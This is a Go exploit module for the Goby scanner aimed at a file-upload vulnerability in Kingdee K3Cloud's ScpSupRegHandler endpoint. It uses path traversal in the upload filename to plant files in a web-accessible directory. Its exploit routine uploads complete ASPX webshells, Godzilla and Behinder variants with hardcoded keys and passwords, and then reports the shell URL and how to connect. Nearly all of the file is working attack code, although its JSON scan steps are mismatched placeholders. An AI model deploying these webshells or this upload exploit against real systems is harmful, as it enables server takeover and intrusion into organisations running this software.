package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingdee K3Cloud ScpSupRegHandler API File Upload Vulnerability",
    "Description": "<p>Kingdee k3cloud is a leading assembleable low code PaaS platform that provides comprehensive services for customer transformation in fields such as research and development, production, marketing, supply chain, and finance.</p><p>Kingdee k3cloud has a file upload vulnerability at ScpSupRegHandler, which allows attackers to gain system privileges by uploading malicious executable files, resulting in the website being in an extremely insecure state.</p>",
    "Product": "Kingdee-K3-Cloud",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2023-05-22",
    "PostTime": "2023-11-16",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "title=\"金蝶云星空\"",
    "GobyQuery": "title=\"金蝶云星空\"",
    "Level": "2",
    "Impact": "<p>Kingdee k3cloud has a file upload vulnerability at ScpSupRegHandler, which allows attackers to gain system privileges by uploading malicious executable files, resulting in the website being in an extremely insecure state.</p>",
    "Recommendation": "<p>The official has fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://vip.kingdee.com/\">https://vip.kingdee.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "xadwae.aspx",
            "show": "attackType=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.IO\"%><% Response.Write(\"hello\"); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload",
        "2H1W"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "金蝶云星空 ScpSupRegHandler 接口文件上传漏洞",
            "Product": "Kingdee-K3-cloud",
            "Description": "<p>金蝶云星空是一款基于领先的可组装低代码 PaaS 平台，全面服务客户研发、生产、营销、供应链、财务等领域转型。</p><p>金蝶云星空在 ScpSupRegHandler 处存在文件上传漏洞，攻击者可通过上传恶意的可执行文件，从而获取系统权限，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://vip.kingdee.com/\">https://vip.kingdee.com/</a></p>",
            "Impact": "<p>金蝶云星空在 ScpSupRegHandler 处存在文件上传漏洞，攻击者可通过上传恶意的可执行文件，从而获取系统权限，导致网站处于极度不安全状态。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Kingdee K3Cloud ScpSupRegHandler API File Upload Vulnerability",
            "Product": "Kingdee-K3-Cloud",
            "Description": "<p>Kingdee k3cloud is a leading assembleable low code PaaS platform that provides comprehensive services for customer transformation in fields such as research and development, production, marketing, supply chain, and finance.</p><p>Kingdee k3cloud has a file upload vulnerability at ScpSupRegHandler, which allows attackers to gain system privileges by uploading malicious executable files, resulting in the website being in an extremely insecure state.</p>",
            "Recommendation": "<p>The official has fixed the vulnerability yet, please contact the manufacturer to fix the vulnerability: <a href=\"https://vip.kingdee.com/\">https://vip.kingdee.com/</a></p>",
            "Impact": "<p>Kingdee k3cloud has a file upload vulnerability at ScpSupRegHandler, which allows attackers to gain system privileges by uploading malicious executable files, resulting in the website being in an extremely insecure state.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9960"
}`
	uploadFileZXOCUJAOWSE := func(hostInfo *httpclient.FixUrl, filename, content string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewPostRequestConfig("/k3cloud/SRM/ScpSupRegHandler")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		getRequestConfig.Header.Store("Content-Type", "multipart/form-data; boundary=2ac719f8e29343df94aa4ab49e456061")
		getRequestConfig.Data = `--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="dbId_v"

.
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FID"

2022
--2ac719f8e29343df94aa4ab49e456061
Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/` + filename + `."
Content-Type: text/plain

` + content + `
--2ac719f8e29343df94aa4ab49e456061--`
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	checkFileExistsXCOIAUEASD := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/k3cloud/uploadfiles/" + filename)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		getRequestConfig.Timeout = 30
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(5) + ".txt"
			content := goutils.RandomHexString(6)
			resp, err := uploadFileZXOCUJAOWSE(hostInfo, filename, content)
			if err == nil && resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `IsSuccess": true`) {
				resp2, err2 := checkFileExistsXCOIAUEASD(hostInfo, filename)
				return err2 == nil && resp2 != nil && resp2.StatusCode == 200 && strings.Contains(resp2.Utf8Html, content)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			filename := goutils.RandomHexString(6) + ".aspx"
			var content string
			if attackType == "godzilla" {
				content = "<%@ Page Language=\"C#\"%><%try { string key = \"3c6e0b8a9c15224a\"; string pass = \"pass\"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(\"-\", \"\"); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session[\"payload\"] == null) { Context.Session[\"payload\"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(\"Load\", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session[\"payload\"]).CreateInstance(\"LY\"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { } %>"
			} else if attackType == "behinder" {
				content = "<%@ Page Language=\"C#\" %><%@Import Namespace=\"System.Reflection\"%><%Session.Add(\"k\",\"e45e329feb5d925b\");byte[] k = Encoding.Default.GetBytes(Session[0] + \"\"),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance(\"U\").Equals(this); %>"
			} else if attackType == "custom" {
				filename = goutils.B2S(stepLogs.Params["filename"])
				content = goutils.B2S(stepLogs.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			resp, err := uploadFileZXOCUJAOWSE(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 {
				if checkResp, checkErr := checkFileExistsXCOIAUEASD(expResult.HostInfo, filename); err != nil {
					expResult.Output = checkErr.Error()
				} else if checkResp.StatusCode == 200 || checkResp.StatusCode == 500 {
					expResult.Success = true
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/k3cloud/uploadfiles/" + filename
					if attackType == "godzilla" {
						expResult.Output += "\n密码: pass 密钥：key 加密器：CSHAP_AES_BASE64\n"
						expResult.Output += "WebShell tool: Godzilla v4.1\n"
					} else if attackType == "behinder" {
						expResult.Output += "\nPassword: rebeyond\n"
						expResult.Output += "WebShell tool: Behinder v3.0\n"
					}
					expResult.Output += "Webshell type: aspx"
				}
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}
